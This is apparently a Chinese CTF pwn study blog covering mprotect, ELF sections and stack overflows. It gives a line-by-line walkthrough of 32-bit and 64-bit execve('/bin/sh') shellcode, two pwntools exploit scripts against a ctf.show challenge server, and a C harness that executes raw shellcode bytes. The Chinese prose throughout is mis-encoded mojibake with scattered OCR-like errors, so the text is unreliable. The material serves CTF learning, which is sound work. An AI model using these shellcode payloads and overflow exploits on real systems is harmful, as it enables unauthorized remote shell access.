æ£€æµ‹åˆ°æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºæˆ–å…¶ä»–å®‰å…¨é—®é¢˜æ—¶ï¼Œå®ƒä¼šç”Ÿæˆç›¸åº”çš„è­¦å‘Šå’Œé”™è¯¯æŠ¥å‘Šã€‚ FORTIFY_SOURCE æä¾›äº†ä¸€å±‚é¢å¤–çš„å®‰å…¨ä¿æŠ¤ï¼Œå®ƒå¯ä»¥åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘å¸¸è§çš„ç¼“å†²åŒºæº¢å‡ºå’Œå­—ç¬¦ä¸²æ“ä½œç›¸å…³çš„å®‰å…¨æ¼æ´ã€‚</li></ol><p>signal(11, (__sighandler_t)sigsegv_handler);å‡½æ•°å½“å‘ç”Ÿ å¯¹å­˜å‚¨çš„æ— æ•ˆè®¿é—®æ—¶,ä¼šæŠŠstderræ‰“å°è¾“å‡º,å³å°†flagçš„å€¼æ‰“å°è¾“å‡º</p><p><strong>mprotectå‡½æ•°</strong>ï¼ˆé™æ€ç¼–è¯‘æ—¶å¯æœç´¢ã€å‡½æ•°å¾ˆå¤šã€‘ï¼‰</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span> --ï¼ˆ<span class="keyword">filename</span>ï¼‰ checksec --ï¼ˆ<span class="keyword">filename</span>ï¼‰</span><br></pre></td></tr></table></figure><p>ä½œç”¨ï¼šä¿®æ”¹å†…å­˜çš„æƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œ</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230713170259726.png" alt="image-20230713170259726"></p><p>protå¯ä»¥å–ä»¥ä¸‹å‡ ä¸ªå€¼ï¼Œå¹¶ä¸”å¯ä»¥ç”¨â€œ|â€å°†å‡ ä¸ªå±æ€§åˆèµ·æ¥ä½¿ç”¨ï¼š </p><p>1ï¼‰PROT_READï¼šè¡¨ç¤ºå†…å­˜æ®µå†…çš„å†…å®¹å¯è¯»ï¼›<br> 2ï¼‰PROT_WRITEï¼šè¡¨ç¤ºå†…å­˜æ®µå†…çš„å†…å®¹å¯äº›ï¼›<br> 3ï¼‰PROT_EXECï¼šè¡¨ç¤ºå†…å­˜æ®µä¸­çš„å†…å®¹å¯æ‰§è¡Œï¼›<br> 4ï¼‰PROT_NONEï¼šè¡¨ç¤ºå†…å­˜æ®µä¸­çš„å†…å®¹æ ¹æœ¬æ²¡æ³•è®¿é—®ã€‚<br> 5ï¼‰ prot&#x3D;7 æ˜¯å¯è¯»å¯å†™å¯æ‰§è¡Œ æŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ã€‚</p><p>åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œ å¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚å¯¹äºé™æ€ç¨‹åºæœ¬èº«ï¼Œåœ°å€æ˜¯ä¸ä¼šå˜çš„ã€‚ æŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ã€‚åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œ å¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚å› ä¸ºç¨‹åºæœ¬èº«ä¹Ÿæ˜¯é™æ€ç¼–è¯‘ï¼Œæ‰€ä»¥åœ°å€æ˜¯ä¸ä¼šå˜çš„ã€‚</p><p><strong>èµ·å§‹åœ°å€åˆ¤æ–­æ–¹æ³•</strong> ï¼šâ‘ æµ‹è¯•åœ°å€&amp;0xfffç»“æœä¸º0 â‘¡%4096ç»“æœä¸º0ï¼ˆä¸€é¡µä¸º4k&#x3D;4096ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230726151609037.png" alt="image-20230726151609037"></p><p>æ‰¾åˆ°æº¢å‡ºç‚¹ ç¨‹åºæ— åé—¨åˆ™è‡ªåŠ¨ç”Ÿæˆshellcodeï¼ˆæ¡ä»¶å…è®¸å¯ret2libcï¼‰åˆ©ç”¨mprotectå‡½æ•°+gadgetsæ”»å‡»ï¼ˆæ³¨æ„å‚æ•°æš‚æ—¶å°å®¶ã€ä¸€æ¬¡retæœ€å¥½ã€‘ï¼‰é€šè¿‡readå‡½æ•°å°†shellcodeè¯»å…¥ç¨‹åºæ®µ </p><p>readå‡½æ•°åŸå‹: </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>fd è®¾ä¸º0æ—¶å°±å¯ä»¥ä»è¾“å…¥ç«¯è¯»å–å†…å®¹ è®¾ä¸º0<br>buf è®¾ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å†…å­˜åœ°å€<br>è®¾ä¸ºæˆ‘ä»¬å·²æ‰¾åˆ°çš„å†…å­˜åœ°å€size é€‚å½“å¤§å°å°±å¯ä»¥ åªè¦å¤Ÿè¯»å…¥shellcodeå°±å¯ä»¥ï¼Œè®¾ç½®å¤§ç‚¹æ— æ‰€è°“</p><p><strong>.pltèŠ‚</strong><br>plt(Procedure Linkage Table)ï¼Œ.pltèŠ‚åŒ…å«äº†ä»åŠ¨æ€é“¾æ¥å™¨è°ƒç”¨è°ƒç”¨ä»å…±äº«åº“ä¸­å¯¼å…¥å‡½æ•°æ‰€å¿…éœ€çš„ä»£ç ,è¯¥èŠ‚ä¸­åŒ…å«ä»£ç ï¼ŒèŠ‚ç±»å‹è¢«æ ‡è®°ä¸ºSHT_PROGBITS<br><strong>.got.plt</strong><br>ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„gotè¡¨ï¼Œ.got.pltèŠ‚ä¿ç•™äº†å…¨å±€åç§»è¡¨ã€‚.gotå’Œ.pltèµ·æä¾›äº†å¯¹å¯¼å…¥å…±äº«åº“å‡½æ•°çš„è®¿é—®å…¥å£,ç”±åŠ¨æ€é“¾æ¥å™¨åœ¨è¿è¡Œæ—¶è¿›è¡Œä¿®æ”¹ã€‚å¦‚æœæ”»å‡»è€…è·å–åˆ°äº†å †æˆ–.bssæ¼æ´çš„ä¸€ä¸ªæŒ‡é’ˆå¤§å°çš„å†™åŸè¯­<br>å°±å¯ä»¥å¯¹è¯¥èŠ‚è¿›è¡Œä»»æ„ä¿®æ”¹.got.pltè·Ÿç¨‹åºæ‰§è¡Œæœ‰å…³ï¼Œè¯¥èŠ‚ç±»å‹è¢«æ ‡è®°ä½SHT_PROGBITS<br><strong>.rel.</strong>*<br>.rel.â€æ˜¯ä¸€ç§é€šç”¨çš„å‘½åæ¨¡å¼,ç”¨äºè¡¨æ ‡ä¸é‡å®šä½(relocation)ç›¸å…³çš„èŠ‚ (section)åç§°ã€‚åœ¨ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨ä¸­,é‡å®šä½æ˜¯å°†ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·å¼•ç”¨ä¸ç¬¦å·å®šä¹‰å…³è”èµ·æ¥çš„è¿‡ç¨‹ã€‚<br>åœ¨å¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«åº“ä¸­ï¼Œæœ‰è®¸å¤šä¸åŒçš„èŠ‚ï¼ˆä¾‹å¦‚ä»£ç èŠ‚ã€æ•°æ®èŠ‚ã€ç¬¦å·è¡¨èŠ‚ç­‰).rel.èŠ‚é€šå¸¸ç”¨äºå­˜å‚¨é‡å®šä½è¡¨(relocation table) ,å…¶ä¸­åŒ…å«äº†éœ€è¦è¿›è¡Œé‡å®šä½çš„ç¬¦å·å¼•ç”¨å’Œç›¸åº”çš„é‡å®šä½ç±»å‹ã€‚<br>é‡å®šä½è¡¨è®°å½•äº†åŠ è½½å’Œé“¾æ¥è¿‡ç¨‹ä¸­éœ€è¦ä¿®å¤çš„ä½ç½®ï¼Œä»¥ä¾¿æ­£ç¡®è§£æç¬¦å·å¼•ç”¨,é€šè¿‡è¯»å–é‡å®šä½è¡¨,ç³»ç»Ÿæˆ–é“¾æ¥å™¨å¯ä»¥æ ¹æ®ç¬¦å·çš„å®šä¹‰ä½ç½®æ¥è®¡ç®—å¹¶æ›´æ–°ç¬¦å·å¼•Iç”¨çš„å®é˜Ÿç¤ºåœ°i1<br>.re1.*èŠ‚çš„å…·ä½“å‘½åæ–¹å¼å¯èƒ½å› ä¸åŒçš„å·¥å…·é“¾å’Œç›®æ ‡æ–‡ä»¶æ ¼å¼è€Œæœ‰æ‰€ä¸åŒ,ä¾‹å¦‚ï¼Œåœ¨ELFæ ¼å¼çš„ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œ.rel.textè¡¨ç¤ºä¸ä»£ç èŠ‚(.text)ç›¸å…³çš„å›ºå®šä½è¡¨ã€‚<br>å¸¸è§çš„.rel.èŠ‚åŒ…æ‹¬:<br>.rel.text :ä¸ä»£ç èŠ‚ç›¸å…³çš„é‡å®šä½è¡¨.<br>.rel.data:ä¸æ•°æ®èŠ‚ç›¸å…³çš„é‡å®šä½è¡¨<br>Â·.rel.bss:ä¸æœªåˆå§‹åŒ–æ•°æ®èŠ‚(8SS)ç›¸å…³çš„é‡å®šä½è¡¨<br>.rel.rodata ;ä¸åªè¯»æ•°æ®èŠ‚ç›¸å…³çš„é‡å®šä½è¡¨<br><strong>.strtabèŠ‚</strong><br>å­—ç¬¦ä¸²è¡¨ï¼Œå…¶åŒ…æ‹¬.symtablå’Œ.debugèŠ‚åŒºä¸­çš„ç¬¦å·è¡¨ä»¥åŠèŠ‚å¤´éƒ¨çš„èŠ‚åç§°ã€‚è¡¨ä¸­çš„å†…å®¹ä¼šè¢«.symtabçš„EIN_Sym(Eilf32_ SymRElf64_Sym)ç»“æ„ä¸­çš„st_nameæ¡ç›®å¼•ç”¨<br>objdump -R æ˜¯ä¸€ä¸ªç”¨äºæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶ä¸­é‡å®šä½è¡¨ (relocation table)çš„å‘½ä»¤ã€‚è¯¥å‘½ä»¤ä¼šæ˜¾ç¤ºå‡ºç›®æ ‡æ–‡ä»¶ä¸­æ¶‰åŠåˆ°çš„å¤–éƒ¨ç¬¦å·çš„é‡å®šä½ä¿¡æ¯<br>é‡å®šä½è¡¨è®°å½•äº†éœ€è¦åœ¨èˆ¹æ¥æˆ–åŠ è½½è¿‡ç¨‹ä¸­ä¿®å¤çš„ä½ç½®ï¼Œä»¥ä¾¿æ­£ç¡®è§£æå¤–éƒ¨ç¬¦å·çš„åœ°å€ã€‚é€šè¿‡æŸ¥çœ‹é‡å®šä½è¡¨ï¼Œå¯ä»¥äº†è§£åˆ°ç¨‹åºä¸­å“ªäº›ä½ç½®éœ€è¦è¿›è¡Œé‡å®šä½ä»¥åŠæ¶‰åŠçš„å¤–éƒ¨<br>readelfS æ˜¯ä¸€ä¸ªç”¨äºç›´çœ‹ç›®æ ‡æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶ä¸­èŠ‚(section)ä¿¡æ¯çš„å‘½ä»¤ã€‚å®ƒå¯ä»¥æ˜¾ç¤ºå‡ºç›®æ ‡æ–‡ä»¶çš„åä¸ªèŠ‚çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬åç§°å¤§å°ã€åç§»é‡ã€é“¾æ¥å±æ€§ç­‰ã€‚</p><p><strong>putsé‡åˆ°â€™\x00â€™æ‰åœæ­¢</strong><br>å¯è¾…åŠ©æ‰“å°å‡ºå‡½æ•°å˜é‡ç›¸é‚»å…³é”®ä¿¡æ¯.ï¼ˆä¾‹ æ²¡è¯»å…¥putså‡½æ•°æœ€åä¸€ä¸ªå€¼å¯¼è‡´ç¨‹åºåœ¨putsæ—¶è¿å¸¦ä¸‹æ–¹ç´§è”ç³»çš„å…³é”®å€¼ã€ç”¨æˆ·ç™»å½•å¯†ç ã€‘ï¼‰</p><p><strong>32ä½shellcode</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805225412511.png" alt="image-20230805225412511"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231715929.png" alt="image-20230805231715929"></p><p>Linuxæ‰§è¡Œexecveï¼ˆâ€œ&#x2F;bin&#x2F;shâ€,NULL,NULLï¼‰</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">push</span> <span class="number">0</span>x68</span><br></pre></td></tr></table></figure><p>å°†0x68ï¼ˆ104ï¼‰å‹å…¥æ ˆä¸­ï¼Œè¿™æ˜¯ä¸ºäº†å°†åç»­çš„å­—ç¬¦ä¸²â€&#x2F;bin&#x2F;shâ€æ”¾å…¥æ ˆä¸­ï¼Œä»¥ä¾¿åç»­è°ƒç”¨.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0x732f2f2f</span></span><br></pre></td></tr></table></figure><p>ç”±äºx86æ ˆå­˜å‚¨ä¸ºå°ç«¯åºï¼Œæ­¤æ­¥æ˜¯ä¸ºäº†å°†â€&#x2F;bin&#x2F;shâ€çš„å‰åŠéƒ¨åˆ†å­—ç¬¦é€†åºå‹å…¥æ ˆä¸­å³â€sh&#x2F;&#x2F;â€œ</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0x6e69622f</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯ååŠéƒ¨åˆ†å–½ï¼ˆâ€&#x2F;binâ€ï¼‰</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>ï¼Œ<span class="built_in">esp</span></span><br></pre></td></tr></table></figure><p>å°†â€&#x2F;bin&#x2F;shâ€èµ·å§‹åœ°å€å¤åˆ¶ç»™ebx.ebxå°†ä½œä¸ºexecveè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³è¦æ‰§è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">ecx</span>ï¼Œ<span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">edx</span>ï¼Œ<span class="built_in">edx</span></span><br></pre></td></tr></table></figure><p>^æ“ä½œå°†ecxå’Œebxç½®ä¸º0ï¼Œç›®çš„å°±æ˜¯å°†æ­¤ä¿©å¯„å­˜å™¨ä½œä¸ºè°ƒç”¨çš„ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³å‘½ä»¤è¡Œå‚æ•°å’Œç¯å¢ƒå˜é‡.ï¼ˆ0-&gt;NULL æ— æ­¤ä¸¤å˜é‡ï¼‰</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0xB</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebx</span></span><br></pre></td></tr></table></figure><p>å°†å€¼11ï¼ˆ0xbï¼‰å‹å…¥æ ˆä¸­ï¼Œå¼¹åˆ°eaxå¯„å­˜å™¨ä¸­ï¼Œä½œä¸ºç³»ç»Ÿè°ƒç”¨å·ï¼ˆè¿™ä¹ˆæ–¹ä¾¿å½“ç„¶ä¸æ­¢è¿™ä¸€ç§å–½ğŸ˜€ï¼‰</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>è§¦å‘ä¸­æ–­ï¼ˆå‰é¢çš„ç§ç§åŸ‹ä¼ï¼ˆeaxï¼Œebx, ecx, edxï¼‰å°±æ˜¯ä¸ºäº†æ»¡è¶³ç³»ç»Ÿè°ƒç”¨ å¯åŠ¨ä¸€ä¸ªæ–°shellï¼‰</p><p><strong>64ä½shellcoede</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231443170.png" alt="image-20230805231443170"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231656076.png" alt="image-20230805231656076"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rax</span></span><br></pre></td></tr></table></figure><p>å‹å…¥raxå€¼ ä¿ç•™ ä¸ºåç»­ä½¿ç”¨</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">rdx</span>ï¼Œ<span class="built_in">rdx</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rsi</span>ï¼Œ<span class="built_in">rsi</span></span><br></pre></td></tr></table></figure><p>å°†ä¸¤å¯„å­˜å™¨ç½®0ï¼Œä½œä¸ºexecveç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆæ»¡è¶³64ä½è°ƒç”¨è§„åˆ™ï¼‰</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> rbxï¼Œ<span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>å°†â€™bin&#x2F;shâ€™èµ‹å€¼ç»™rbx</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rbx</span>#<span class="string">&quot;/bin/sh&quot;</span>çš„åœ°å€</span><br></pre></td></tr></table></figure><p>ç»™execveï¼ˆï¼‰ä¼ è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼ˆâ€œ&#x2F;bin&#x2F;shâ€ï¼‰</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rsp</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span></span><br></pre></td></tr></table></figure><p>å°†â€&#x2F;bin&#x2F;shâ€çš„åœ°å€å¼¹åˆ°rdiå¯„å­˜å™¨ æ–¹ä¾¿execveï¼ˆï¼‰è°ƒç”¨</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>ï¼Œ<span class="number">59</span></span><br></pre></td></tr></table></figure><p>è®¾ç½®ç³»ç»Ÿè°ƒç”¨å·</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">syscall</span></span><br></pre></td></tr></table></figure><p>è§¦å‘ç³»ç»Ÿè°ƒç”¨</p><p><strong>æ³¨æ„</strong> å¯„å­˜å™¨å€¼çš„è®¾ç½® x86ï¼ˆeaxï¼Œebxï¼Œecxï¼Œedxï¼‰  x64ï¼ˆraxï¼Œrdiï¼Œrsiï¼Œrdxï¼‰</p><p><strong>å°å‘è®°å½•</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806182846402.png" alt="image-20230806182846402"></p><p>â€‹                  å¼€PIE åœ°å€éšæœº</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806183003512.png" alt="image-20230806183003512"></p><p>NXæ²¡æ‰“å¼€æŸ¥çœ‹ä¹Ÿæ²¡æœ‰åé—¨ åˆæƒ³æ³•æ˜¯ç›´æ¥åˆ©ç”¨getsç„¶åè¿”å›åˆ°v4ï¼ˆåˆ©ç”¨pwntollsç”Ÿæˆçš„shellcoedeä¼ å…¥v4åœ°å€ï¼‰ </p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">got = <span class="built_in">int</span>(got,<span class="number">16</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(got) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å†™çš„æ—¶å€™å¿˜è®°recvuntilï¼ˆâ€™]â€™,drop &#x3D; Trueï¼‰ç•¥ç•¥ç•¥w</p><p>å‘ç°EOF æ„Ÿè§‰æ€è·¯æ²¡é—®é¢˜ æŸ¥çœ‹æ±‡ç¼–å’ŒåŠ¨è°ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806183655150.png" alt="image-20230806183655150"></p><p>getsï¼ˆv4ï¼‰åæœ‰leave retnæŒ‡ä»¤â€“&gt;ç›¸å½“äºmov rbp,rsp  pop rbp retn å ç”¨äº†24ä¸ªå­—èŠ‚ å› æ­¤æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨v4åé¢çš„24bytes</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806184829072.png" alt="image-20230806184829072"></p><p>ç”Ÿæˆçš„shellcodeå¯¹rspè¿›è¡Œäº†å…¶ä»–æ“ä½œæ‰€ä»¥v4åçš„8bytesä¹Ÿä¸èƒ½å­˜æ”¾.</p><p>ä¿®æ­£åçš„expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">got = <span class="built_in">int</span>(got,<span class="number">16</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(got + <span class="number">24</span> +<span class="number">8</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>è·å–shellcodeçš„å‡ ç§æ–¹æ³•</strong></p><p><a href="https://www.freebuf.com/articles/system/237300.html">https://www.freebuf.com/articles/system/237300.html</a></p><p>ä½¿ç”¨readï¼ˆï¼‰â€“&gt;é™åˆ¶shellcodeé•¿åº¦ <strong>æ³¨æ„è®¡ç®—shellcodeé•¿åº¦</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807113729341.png" alt="image-20230807113729341"></p><p>PIEæ‰“å¼€ åœ°å€éšæœº</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807114028427.png" alt="image-20230807114028427"></p><p>readé™åˆ¶è¾“å…¥0x38ï¼ˆ36ï¼‰å¤§å°  bufå¯åˆ†é…å¤§å°ä¸º0x10 åœ¨readå¤„å­˜åœ¨æ˜æ˜¾æº¢å‡º åç§»ä¸º0x10+8ï¼ˆ24ï¼‰ å› æ­¤shellcodeå¤§å°å¿…åœ¨24å†…ï¼ˆæ›´çŸ­çš„ä¹Ÿç±»ä¼¼è®¡ç®—ï¼‰<br>ï¼Ÿ é‡åˆ°shellcodeé•¿åº¦è®¡ç®—ä¸º23  buf_addr + 32å¤§å°å¼€å§‹æ³¨å…¥<br>ï¼ˆæ•´å­—èŠ‚æ³¨å…¥å–½ å°äº†ä¸å¤Ÿ å¤§äº†è¦†ç›–å…¶ä»–åŒºåŸŸå‡ºé”™ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">global _start</span></span><br><span class="line"><span class="comment">section .text</span></span><br><span class="line"><span class="comment">_start:</span></span><br><span class="line"><span class="comment">push 59</span></span><br><span class="line"><span class="comment">pop rax</span></span><br><span class="line"><span class="comment">cdq</span></span><br><span class="line"><span class="comment">push rdx</span></span><br><span class="line"><span class="comment">mov rbx,0x68732f6e69622f2f</span></span><br><span class="line"><span class="comment">push rbx</span></span><br><span class="line"><span class="comment">push rsp</span></span><br><span class="line"><span class="comment">pop rdi</span></span><br><span class="line"><span class="comment">push rdx</span></span><br><span class="line"><span class="comment">push rdi</span></span><br><span class="line"><span class="comment">push rsp</span></span><br><span class="line"><span class="comment">pop rsi</span></span><br><span class="line"><span class="comment">syscall</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> code[] = <span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span>;</span><br><span class="line"><span class="comment">// char code[] = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len:%d bytes\n&quot;</span>, <span class="built_in">strlen</span>(code));</span><br><span class="line">    (*(<span class="type">void</span>(*)()) code)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">           </span><br></pre></td></tr></table></figure><p> æœ‰é™shellcode è·å–ç½‘ç«™<a href="https://www.exploit-db.com/shellcodes/43550">https://www.exploit-db.com/shellcodes/43550</a></p><p><strong>æœ‰æ—¶å¼€å¯æŸç§ä¿æŠ¤ä¸ä»£è¡¨è¿™æ¡è·¯ä¸é€š</strong><br>                     <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807120842290.png" alt="image-20230807120842290">  </p><p>NXæ‰“å¼€ çœŸçš„ä¸å¯è‡ªè¡Œå†™å…¥å—ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807120907096.png" alt="image-20230807120907096"></p><p>æ— åé—¨ 